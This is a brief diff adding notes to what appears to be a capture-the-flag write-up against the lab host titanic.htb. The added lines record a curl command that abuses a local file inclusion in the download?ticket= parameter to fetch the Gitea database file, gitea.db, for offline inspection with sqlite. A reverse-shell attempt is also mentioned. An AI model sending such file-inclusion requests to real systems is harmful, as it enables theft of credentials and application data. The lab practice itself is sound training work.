@@ -51,3 +51,7 @@ Got error:
 
 Reverse shell http listener did not work because of this. Trying to find a work-around
 
+gitea stores information on gitea.db so I used the previous download?ticket= LFI path to extract the gitea.db:
+curl -s "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db" -o gitea.db
+
+This gave me gitea.db on my local machine which I then opened with sqlite to view the database.
